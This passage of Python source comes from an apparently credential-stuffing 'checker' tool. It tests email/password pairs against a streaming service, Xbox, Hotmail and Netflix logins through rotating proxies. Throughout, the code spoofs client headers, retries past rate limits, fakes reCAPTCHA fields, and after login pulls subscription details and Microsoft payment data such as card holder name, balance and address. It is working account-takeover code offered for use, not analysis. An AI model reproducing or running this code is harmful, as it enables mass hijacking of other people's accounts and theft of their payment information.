            "HK": "Hong Kong", "PK": "Pakistan", "NZ": "New Zealand", "SK": "Slovakia",
            "HR": "Croatia", "RS": "Serbia", "BG": "Bulgaria",
        }

    def _proxy_url(self, proxy_str):
        if not proxy_str:
            return None
        p = proxy_str.strip()
        if '://' in p:
            return p
        parts = p.split(':')
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{p}"

    def _session(self, proxy_str=None):
        sess = requests.Session()
        pu = self._proxy_url(proxy_str)
        if pu:
            sess.proxies = {'http': pu, 'https': pu}
        return sess

    def check(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxy_str = self.proxy if self.proxy else None

        for attempt in range(self.max_retry):
            try:
                return self._check_internal(email, password, proxy_str, attempt)
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
                if attempt < self.max_retry - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                result["status"] = "error"
                result["message"] = "Network error"
                return result
            except Exception as e:
                if attempt < self.max_retry - 1:
                    time.sleep(random.uniform(2, 5))
                    continue
                result["status"] = "error"
                result["message"] = str(e)[:60]
                return result

        result["status"] = "error"
        result["message"] = "Max retries"
        return result

    def _check_internal(self, email, password, proxy_str, attempt):
        sess = self._session(proxy_str)
        device_id = str(uuid.uuid4())
        anonymous_id = str(uuid.uuid4())

        token_data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": self.brn_cid,
            "client_secret": self.brn_sec,
            "device_type": "Google SDK built for x86",
            "device_id": device_id,
            "device_name": "sdk_google_atv_x86",
        }
        token_headers = {
            "User-Agent": self.baron_ua,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": anonymous_id,
            "Request-Type": "SignIn",
        }
        r = sess.post(f"{self.brn_api}/auth/v1/token",
                      data=token_data,
                      headers=token_headers,
                      timeout=self.timeout)

        if r.status_code == 429:
            if attempt < self.max_retry - 1:
                time.sleep(random.uniform(5, 10))
                raise Exception("Rate limited")
            return {"status": "error", "message": "Rate limited"}

        if r.status_code in (401, 400) or "invalid_grant" in r.text or "invalid_credentials" in r.text:
            return {"status": "bad", "message": "Invalid credentials"}

        try:
            token_json = r.json()
        except:
            return {"status": "error", "message": "JSON parse error"}

        access_token = token_json.get("access_token")
        if not access_token:
            return {"status": "error", "message": "No access token"}

        def auth_headers():
            return {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": self.baro_wua,
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

        # Get account info
        r = sess.get(f"{self.brn_api}/accounts/v1/me", headers=auth_headers(), timeout=self.timeout)
        if r.status_code != 200:
            return {"status": "error", "message": "Account fetch failed"}
        account_data = r.json()
        external_id = account_data.get("external_id", "")
        account_id = account_data.get("account_id", "")
        email_verified = account_data.get("email_verified", False)
        username = account_data.get("username", "")

        if not username:
            try:
                r2 = sess.get(f"{self.brn_api}/accounts/v1/me/multiprofile", headers=auth_headers(), timeout=self.timeout)
                m = re.search(r'"username"\s*:\s*"([^"]+)"', r2.text)
                if m:
                    username = m.group(1)
            except:
                pass
        if not username:
            username = email.split("@")[0]

        info = {
            "user": username,
            "verified": "Yes" if email_verified else "No",
            "plan": "",
            "sku": "",
            "streams": "",
            "expires": "",
            "renew": "",
            "country": "",
            "payment": "",
        }

        if not external_id:
            return {"status": "free", "message": "No subscription", **info}

        # Get subscription benefits
        r = sess.get(f"{self.brn_api}/subs/v1/subscriptions/{external_id}/benefits",
                     headers=auth_headers(), timeout=self.timeout)
        if r.status_code != 200:
            return {"status": "free", "message": "No subscription", **info}

        benefits_text = r.text

        if "subscription.not_found" in benefits_text or '"total":0' in benefits_text or '"subscription_country":""' in benefits_text:
            return {"status": "free", "message": "No active subscription", **info}

        # Extract plan
        sm = re.search(r'"concurrent_streams\.(\d+)"', benefits_text)
        if sm:
            streams = sm.group(1)
            info["streams"] = streams
            info["plan"] = self.plan_map.get(streams, f"PLAN_{streams}")

        # Extract country
        cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', benefits_text)
        if cm:
            cc = cm.group(1)
            info["country"] = self.country_map.get(cc, cc)

        # Extract payment source
        pm = re.search(r'"source"\s*:\s*"([^"]+)"', benefits_text)
        if pm:
            info["payment"] = pm.group(1)

        # Get subscription details
        if account_id:
            try:
                r = sess.get(f"{self.brn_api}/subs/v3/subscriptions/{account_id}",
                             headers=auth_headers(), timeout=self.timeout)
                if r.status_code == 200:
                    sub3 = r.text
                    em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', sub3)
                    if em:
                        info["expires"] = em.group(1)
                    rm = re.search(r'"auto_renew"\s*:\s*(true|false)', sub3)
                    if rm:
                        info["renew"] = "Yes" if rm.group(1) == "true" else "No"
                    sk = re.search(r'"sku"\s*:\s*"([^"]+)"', sub3)
                    if sk:
                        info["sku"] = sk.group(1)
            except:
                pass

        if info["plan"]:
            return {"status": "premium", "message": f"Plan: {info['plan']}, Country: {info['country']}, Expires: {info['expires']}", **info}
        else:
            return {"status": "free", "message": "No active subscription", **info}

# ----- 9. Xbox Checker -----
class XboxChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def _get_proxy_dict(self):
        if not self.proxy:
            return None
        p = self.proxy.strip()
        if '://' in p:
            return {"http": p, "https": p}
        parts = p.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}", "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                    "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
        return None

    def _get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "email": email, "password": password, "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "email": email, "password": password, "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxy_dict = self._get_proxy_dict()
        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)

        correlation_id = str(uuid.uuid4())
        pass

        url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": correlation_id,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        r1 = session.get(url1, headers=headers1, timeout=15)

        if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
            return {"status": "bad", "message": "Not a Microsoft account"}
        if "MSAccount" not in r1.text:
            return {"status": "bad", "message": "Not a Microsoft account"}

        time.sleep(0.05)

        url2 = ("https://login.live.com/oauth20_authorize.srf?"
                "client_id=0000000048170EF2"
                "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                "&response_type=code"
                "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                "&display=touch&username=" + email)

        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

        if not url_match or not ppft_match:
            return {"status": "bad", "message": "Login page parse failed"}

        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                      "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=" +
                      "&passwd=" + password +
                      "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=" +
                      "&canary=&ctx=&hpgrequestid=&PPFT=" + ppft +
                      "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0" +
                      "&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0" +
                      "&isRecoveryAttemptPost=0&i19=9960")

        headers3 = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }
        r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

        if "account or password is incorrect" in r3.text:
            return {"status": "bad", "message": "Invalid credentials"}

        if "https://account.live.com/identity/confirm" in r3.text:
            return {"status": "2fa", "message": "2FA required"}

        if "https://account.live.com/Abuse" in r3.text:
            return {"status": "bad", "message": "Banned"}

        if "too many" in r3.text.lower() or "locked out" in r3.text.lower() or "try again later" in r3.text.lower():
            return {"status": "error", "message": "Rate limited"}

        if "0x80049DD3" in r3.text:
            return {"status": "error", "message": "No consent"}

        hr_match = re.search(r'HR=0x([0-9A-Fa-f]+)', r3.text)
        if hr_match and len(r3.text) < 5000:
            return {"status": "error", "message": f"HR=0x{hr_match.group(1)}"}

        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "bad", "message": "No redirect"}

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "bad", "message": "No code"}

        code = code_match.group(1)

        token_data = ("client_id=0000000048170EF2"
                      "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                      "&grant_type=authorization_code&code=" + code +
                      "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL")

        r4 = session.post("https://login.live.com/oauth20_token.srf",
                          data=token_data,
                          headers={"Content-Type": "application/x-www-form-urlencoded"},
                          timeout=15)

        if "access_token" not in r4.text:
            return {"status": "bad", "message": "Token exchange failed"}

        token_json = r4.json()
        access_token = token_json["access_token"]

        country = ""
        name = ""

        # Payment auth
        time.sleep(0.05)
        user_id = str(uuid.uuid4()).replace('-', '')[:16]
        state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
        payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?"
                            "client_id=000000000004773A"
                            "&response_type=token"
                            "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                            "&state=" + urlparse.quote(state_json) + "&prompt=none")

        headers6 = {
            "Host": "login.live.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Referer": "https://account.microsoft.com/"
        }
        r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=10)

        payment_token = None
        search_text = r6.text + " " + r6.url
        for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
            match = re.search(pattern, search_text)
            if match:
                payment_token = urlparse.unquote(match.group(1))
                break

        if not payment_token:
            return {"status": "free", "message": "No payment token (free account)"}

        payment_data = {"country": country, "name": name}
        correlation_id2 = str(uuid.uuid4())

        payment_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "paymentinstruments.mp.microsoft.com",
            "ms-cV": correlation_id2,
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        }

        # Get payment instruments
        payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        r7 = session.get(payment_url, headers=payment_headers, timeout=15)
        if r7.status_code == 200:
            balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
            if balance_match:
                payment_data['balance'] = "$" + balance_match.group(1)
            card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
            if card_match:
                payment_data['card_holder'] = card_match.group(1)
            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
            if country_match:
                payment_data['country'] = country_match.group(1)
            zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
            if zip_match:
                payment_data['zipcode'] = zip_match.group(1)
            city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
            if city_match:
                payment_data['city'] = city_match.group(1)

        # Check subscriptions
        sub_urls = [
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        ]

        premium_keywords = {
            'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
            'Game Pass Ultimate': 'GAME PASS ULTIMATE',
            'PC Game Pass': 'PC GAME PASS',
            'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
            'Xbox Game Pass Core': 'GAME PASS CORE',
            'Game Pass Core': 'GAME PASS CORE',
            'Xbox Game Pass': 'GAME PASS',
            'Game Pass': 'GAME PASS',
            'Xbox Live Gold': 'XBOX LIVE GOLD',
            'EA Play': 'EA PLAY',
        }

        all_text = ""
        for sub_url in sub_urls:
            try:
                r8 = session.get(sub_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    all_text += r8.text + "\n"
            except:
                continue

        if not all_text:
            return {"status": "free", "message": "No subscription data", **payment_data}

        all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)

        found_type = None
        for keyword, type_name in premium_keywords.items():
            if keyword.lower() in all_text.lower():
                found_type = type_name
                break

        if not found_type:
            return {"status": "free", "message": "No premium subscription found", **payment_data}

        best_date = None
        best_days = -1
        for date_str in all_dates:
            days = self._get_remaining_days(date_str)
            if days.isdigit():
                days_int = int(days)
                if days_int > best_days:
                    best_days = days_int
                    best_date = date_str

        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', all_text)
        auto_renew = "YES" if (auto_match and auto_match.group(1) == "true") else "NO"

        if best_days > 0:
            sub_data = {
                'premium_type': found_type,
                'renewal_date': best_date,
                'days_remaining': str(best_days),
                'auto_renew': auto_renew
            }
            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', all_text)
            if amount_match:
                sub_data['total_amount'] = amount_match.group(1)
            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', all_text)
            if currency_match:
                sub_data['currency'] = currency_match.group(1)
            result = {"status": "premium", "message": f"{found_type} | {best_days} days remaining", **payment_data, **sub_data}
            return result
        else:
            result = {"status": "expired", "message": f"{found_type} (expired)", **payment_data,
                      'premium_type': found_type, 'renewal_date': best_date, 'days_remaining': '0'}
            return result

# ----- 10. Hotmail Checker -----
class HotmailChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 30

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password):
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        session.verify = False
        correlation_id = str(uuid.uuid4())

        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": correlation_id,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive"
        }
        r1 = session.get(url1, headers=headers1, timeout=self.timeout)
        txt1 = r1.text

        if "Neither" in txt1 or "Both" in txt1 or "Placeholder" in txt1 or "OrgId" in txt1:
            return {"status": "bad", "message": "Not a Microsoft account"}
        if "MSAccount" not in txt1:
            return {"status": "bad", "message": "Not a Microsoft account"}

        time.sleep(0.05)

        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive"
        }
        r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)

        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

        if not url_match or not ppft_match:
            return {"status": "bad", "message": "Failed to get PPFT"}

        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)

        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

        headers3 = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://login.live.com",
            "Referer": r2.url
        }
        r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
        response_text = r3.text.lower()

        if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
            return {"status": "bad", "message": "Invalid credentials"}

        if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
            return {"status": "2fa", "message": "2FA required"}
        if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
            return {"status": "2fa", "message": "2FA required"}

        if "https://account.live.com/Abuse" in r3.text:
            return {"status": "bad", "message": "Banned"}

        location = r3.headers.get("Location", "")
        if not location:
            return {"status": "bad", "message": "No redirect"}

        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return {"status": "bad", "message": "No code"}

        return {"status": "premium", "message": "Hotmail valid"}

# ----- 11. Netflix Checker (uses Hotmail validator + inbox search) -----

class NetflixChecker:
    """Netflix login via GraphQL CLCS (curl_cffi) — by @samvir1"""

    def __init__(self, proxy: Optional[str] = None, timeout: int = 20):
        self.proxy = proxy
        self.timeout = timeout
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        self.code_map = {
            "AF": "93", "AL": "355", "DZ": "213", "AS": "1684", "AD": "376", "AO": "244",
            "AI": "1264", "AG": "1268", "AR": "54", "AM": "374", "AW": "297", "AU": "61",
            "AT": "43", "AZ": "994", "BS": "1242", "BH": "973", "BD": "880", "BB": "1246",
            "BY": "375", "BE": "32", "BZ": "501", "BJ": "229", "BM": "1441", "BT": "975",
            "BO": "591", "BA": "387", "BW": "267", "BR": "55", "BN": "673", "BG": "359",
            "BF": "226", "BI": "257", "KH": "855", "CM": "237", "CA": "1", "CV": "238",
            "KY": "1345", "CF": "236", "TD": "235", "CL": "56", "CN": "86", "CO": "57",
            "KM": "269", "CG": "242", "CK": "682", "CR": "506", "CI": "225", "HR": "385",
            "CU": "53", "CY": "357", "CZ": "420", "DK": "45", "DJ": "253", "DM": "1767",
            "DO": "1809", "EC": "593", "EG": "20", "SV": "503", "GQ": "240", "ER": "291",
            "EE": "372", "ET": "251", "FK": "500", "FO": "298", "FJ": "679", "FI": "358",
            "FR": "33", "GF": "594", "PF": "689", "GA": "241", "GM": "220", "GE": "995",
            "DE": "49", "GH": "233", "GI": "350", "GR": "30", "GL": "299", "GD": "1473",
            "GP": "590", "GU": "1671", "GT": "502", "GN": "224", "GW": "245", "GY": "592",
            "HT": "509", "HN": "504", "HK": "852", "HU": "36", "IS": "354", "IN": "91",
            "ID": "62", "IR": "98", "IQ": "964", "IE": "353", "IL": "972", "IT": "39",
            "JM": "1876", "JP": "81", "JO": "962", "KZ": "7", "KE": "254", "KI": "686",
            "KR": "82", "KP": "850", "KW": "965", "KG": "996", "LA": "856", "LV": "371",
            "LB": "961", "LS": "266", "LR": "231", "LY": "218", "LI": "423", "LT": "370",
            "LU": "352", "MO": "853", "MK": "389", "MG": "261", "MW": "265", "MY": "60",
            "MV": "960", "ML": "223", "MT": "356", "MH": "692", "MQ": "596", "MR": "222",
            "MU": "230", "YT": "262", "MX": "52", "FM": "691", "MD": "373", "MC": "377",
            "MN": "976", "ME": "382", "MS": "1664", "MA": "212", "MZ": "258", "MM": "95",
            "NA": "264", "NR": "674", "NP": "977", "NL": "31", "NC": "687", "NZ": "64",
            "NI": "505", "NE": "227", "NG": "234", "NU": "683", "NF": "672", "MP": "1670",
            "NO": "47", "OM": "968", "PK": "92", "PW": "680", "PA": "507", "PG": "675",
            "PY": "595", "PE": "51", "PH": "63", "PN": "64", "PL": "48", "PT": "351",
            "PR": "1787", "QA": "974", "RE": "262", "RO": "40", "RU": "7", "RW": "250",
            "SH": "290", "KN": "1869", "LC": "1758", "PM": "508", "VC": "1784", "WS": "685",
            "SM": "378", "ST": "239", "SA": "966", "SN": "221", "RS": "381", "SC": "248",
            "SL": "232", "SG": "65", "SK": "421", "SI": "386", "SB": "677", "SO": "252",
            "ZA": "27", "ES": "34", "LK": "94", "SD": "249", "SR": "597", "SJ": "47",
            "SZ": "268", "SE": "46", "CH": "41", "SY": "963", "TW": "886", "TJ": "992",
            "TZ": "255", "TH": "66", "TG": "228", "TK": "690", "TO": "676", "TT": "1868",
            "TN": "216", "TR": "90", "TM": "993", "TC": "1649", "TV": "688", "UG": "256",
            "UA": "380", "AE": "971", "GB": "44", "US": "1", "UY": "598", "UZ": "998",
            "VU": "678", "VA": "39", "VE": "58", "VN": "84", "VG": "1284", "VI": "1340",
            "WF": "681", "YE": "967", "ZM": "260", "ZW": "263",
        }

    def _proxy_dict(self, proxy=None):
        p = proxy or self.proxy
        if not p:
            return None
        if not str(p).startswith(("http://", "https://", "socks")):
            p = "http://" + str(p)
        return {"http": p, "https": p}

    def _session(self):
        try:
            return curl_requests.Session()
        except Exception:
            return requests.Session()

    def check(self, email, password, proxy=None):
        session = self._session()
        proxies = self._proxy_dict(proxy)
        ua = self.ua
        nid = str(uuid.uuid4()).replace("-", "")
        uid = str(uuid.uuid4())

        # geo
        country = "US"
        try:
            r_geo = session.get(
                "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
                headers={
                    "host": "geolocation.onetrust.com",
                    "accept": "application/json",
                    "origin": "https://www.netflix.com",
                    "referer": "https://www.netflix.com/",
                    "user-agent": ua,
                },
                proxies=proxies,
                timeout=self.timeout,
                impersonate="chrome124",
            ) if hasattr(session, "get") else None
            if r_geo is not None:
                try:
                    kwargs = dict(headers={
                        "host": "geolocation.onetrust.com",
                        "accept": "application/json",
                        "origin": "https://www.netflix.com",
                        "referer": "https://www.netflix.com/",
                        "user-agent": ua,
                    }, proxies=proxies, timeout=self.timeout)
                    try:
                        r_geo = session.get(
                            "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
                            impersonate="chrome124",
                            **kwargs,
                        )
                    except TypeError:
                        r_geo = session.get(
                            "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location",
                            **kwargs,
                        )
                    geo_src = r_geo.text
                    if '"country":"' in geo_src:
                        country = geo_src.split('"country":"')[1].split('"')[0]
                except Exception:
                    country = "US"
        except Exception:
            country = "US"

        country = (country or "US").upper()
        country_lower = country.lower()
        code = self.code_map.get(country, "1")

        login_url = f"https://www.netflix.com/{country_lower}-en/login"
        try:
            try:
                r_login = session.get(
                    login_url,
                    headers={
                        "host": "www.netflix.com",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "user-agent": ua,
                        "referer": f"https://www.netflix.com/{country_lower}-en/",
                        "upgrade-insecure-requests": "1",
                    },
                    proxies=proxies,
                    timeout=self.timeout,
                    impersonate="chrome124",
                )
            except TypeError:
                r_login = session.get(
                    login_url,
                    headers={
                        "host": "www.netflix.com",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "user-agent": ua,
                        "referer": f"https://www.netflix.com/{country_lower}-en/",
                        "upgrade-insecure-requests": "1",
                    },
                    proxies=proxies,
                    timeout=self.timeout,
                )
            if r_login.status_code != 200:
                return {"status": "error", "message": f"login_page_{r_login.status_code}"}
            login_src = r_login.text or ""
        except Exception as e:
            return {"status": "error", "message": f"login_page:{str(e)[:80]}"}

        def _extract(src, *patterns):
            for p in patterns:
                try:
                    if p in src:
                        return src.split(p)[1].split('"')[0]
                except Exception:
                    pass
            return ""

        clcs_session_id = _extract(login_src, '"clcsSessionId\\":\\"', '"clcsSessionId":"')
        referrer_rendition_id = _extract(login_src, '"referrerRenditionId\\":\\"', '"referrerRenditionId":"')
        version = _extract(login_src, 'X-Netflix.uiVersion":"')
        uuid_val = _extract(login_src, 'hidden":true,"readOnly":true,"fieldType":"String","value":"') or uid

        try:
            netflix_id = session.cookies.get("NetflixId", "") if hasattr(session, "cookies") else ""
            secure_netflix_id = session.cookies.get("SecureNetflixId", "") if hasattr(session, "cookies") else ""
        except Exception:
            netflix_id = secure_netflix_id = ""

        server_state = json.dumps({
            "realm": "growth",
            "name": "LOGIN",
            "clcsSessionId": clcs_session_id,
            "sessionContext": {"session-breadcrumbs": {"funnel_name": "loginWeb"}},
        })
        server_screen_update = json.dumps({
            "realm": "custom",
            "name": "login.with.userLoginId.and.password",
            "metadata": {"recaptchaSiteKey": "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},
            "loggingAction": "Submitted",
            "loggingCommand": "SubmitCommand",
            "referrerRenditionId": referrer_rendition_id,
        })
        graphql_body = json.dumps({
            "operationName": "CLCSScreenUpdate",
            "variables": {
                "format": "HTML",
                "imageFormat": "PNG",
                "locale": f"en-{country}",
                "serverState": server_state,
                "serverScreenUpdate": server_screen_update,
                "inputFields": [
                    {"name": "userLoginId", "value": {"stringValue": email}},
                    {"name": "password", "value": {"stringValue": password}},
                    {"name": "countryCode", "value": {"stringValue": f"+{code}"}},
                    {"name": "countryIsoCode", "value": {"stringValue": country}},
                    {"name": "recaptchaError", "value": {"stringValue": "RESPONSE_TIMED_OUT"}},
                    {"name": "recaptchaResponseTime", "value": {"intValue": 2699}},
                ],
            },
            "extensions": {
                "persistedQuery": {
                    "id": "823e4880-a085-48aa-8962-fcb3be84ae61",
                    "version": 102,
                }
            },
        })
        graphql_headers = {
            "X-Netflix.request.id": nid,
            "X-Netflix.context.operation-Name": "CLCSScreenUpdate",
            "X-Netflix.context.app-Version": version,
            "X-Netflix.context.hawkins-Version": "5.11.1",
            "X-Netflix.request.clcs.bucket": "high",
            "Accept": "*/*",
            "X-Netflix.context.locales": f"en-{country_lower}",
            "Content-Type": "application/json",
